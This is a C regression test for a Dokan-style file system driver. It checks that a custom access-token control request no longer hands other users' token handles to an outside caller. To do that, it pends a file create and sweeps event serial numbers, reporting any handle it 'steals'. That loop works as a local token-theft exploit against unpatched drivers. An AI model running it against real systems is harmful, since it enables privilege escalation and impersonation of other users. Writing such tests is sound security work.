// Regression test for textil#2184: FSCTL_GET_ACCESS_TOKEN used to hand a
// GENERIC_ALL handle of a pending create's subject token to ANY local user.
// The event channel is now restricted to the file system host process, so a
// foreign caller must not receive a single token. The test pends a create
// from its own thread and sweeps serial numbers from the same process (which
// is NOT the FS host).
#include <stdio.h>
#include <windows.h>

#include "dokan.h"

#define MY_FSCTL_GET_ACCESS_TOKEN ((0x0009 << 16) | (0x80C << 2) | 0)

#pragma pack(push, 8)
typedef struct {
  ULONG SerialNumber;
  LONG Status;
  ULONG Flags;
  union {
    struct { ULONG Index; } Directory;
    struct { ULONG Flags; ULONG Information; } Create;
    LARGE_INTEGER Read;
    LARGE_INTEGER Write;
    UCHAR DeletePending;
    ULONG ResetTimeout;
    HANDLE AccessToken;
  } Operation;
  ULONG64 Context;
  ULONG BufferLength;
  ULONG PullEventTimeoutMs;
  UCHAR Buffer[8];
} MY_EVENT_INFORMATION;
#pragma pack(pop)

static volatile LONG g_stolen = 0;

static DWORD WINAPI SweepOpenThread(LPVOID p) {
  HANDLE h = CreateFileW((LPCWSTR)p, GENERIC_READ,
                         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                         NULL, OPEN_EXISTING, 0, NULL);
  if (h != INVALID_HANDLE_VALUE)
    CloseHandle(h);
  return 0;
}

// usage: token_sweep [mountpoint] [max-serial]
int wmain(int argc, wchar_t **argv) {
  LPCWSTR mount = argc > 1 ? argv[1] : L"C:\\mnt\\sectest-t2";
  ULONG maxSerial = argc > 2 ? (ULONG)_wtoi(argv[2]) : 20000;
  ULONG n = 0;
  PDOKAN_MOUNT_POINT_INFO list = DokanGetMountPointList(FALSE, &n);
  if (!list) {
    printf("FAIL: no mount list\n");
    return 1;
  }
  WCHAR dev[256] = {0};
  size_t ml = wcslen(mount);
  for (ULONG i = 0; i < n; i++) {
    size_t mpl = wcslen(list[i].MountPoint);
    if (mpl >= ml && _wcsicmp(list[i].MountPoint + mpl - ml, mount) == 0)
      swprintf(dev, 256, L"\\\\?\\GLOBALROOT%s", list[i].DeviceName);
  }
  if (!dev[0]) {
    printf("FAIL: mount not found\n");
    return 1;
  }

  WCHAR target[MAX_PATH];
  swprintf(target, MAX_PATH, L"%s\\sectest-pending.txt", mount);
  HANDLE th = CreateThread(NULL, 0, SweepOpenThread, target, 0, NULL);
  Sleep(3000);

  HANDLE d = CreateFileW(dev, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                         OPEN_EXISTING, 0, NULL);
  if (d == INVALID_HANDLE_VALUE) {
    printf("FAIL: device open failed %lu\n", GetLastError());
    return 1;
  }
  for (ULONG s = 1; s < maxSerial; s++) {
    MY_EVENT_INFORMATION ev, out;
    ZeroMemory(&ev, sizeof ev);
    ZeroMemory(&out, sizeof out);
    ev.SerialNumber = s;
    DWORD ret = 0;
    if (DeviceIoControl(d, MY_FSCTL_GET_ACCESS_TOKEN, &ev, sizeof ev, &out,
                        sizeof out, &ret, NULL)) {
      HANDLE tok = out.Operation.AccessToken;
      UCHAR buf[512];
      DWORD len = 0;
      char name[128] = {0}, dom[128] = {0};
      DWORD nl = sizeof name, dl = sizeof dom;
      SID_NAME_USE use;
      if (GetTokenInformation(tok, TokenUser, buf, sizeof buf, &len)) {
        LookupAccountSidA(NULL, ((PTOKEN_USER)buf)->User.Sid, name, &nl, dom,
                          &dl, &use);
      }
      printf("STOLEN serial=%lu token=%p user=%s\\%s\n", s, (void *)tok, dom,
             name);
      InterlockedIncrement(&g_stolen);
      CloseHandle(tok);
    }
  }
  printf("sweep done, stolen=%ld\n", g_stolen);
  return g_stolen == 0 ? 0 : 2;
}
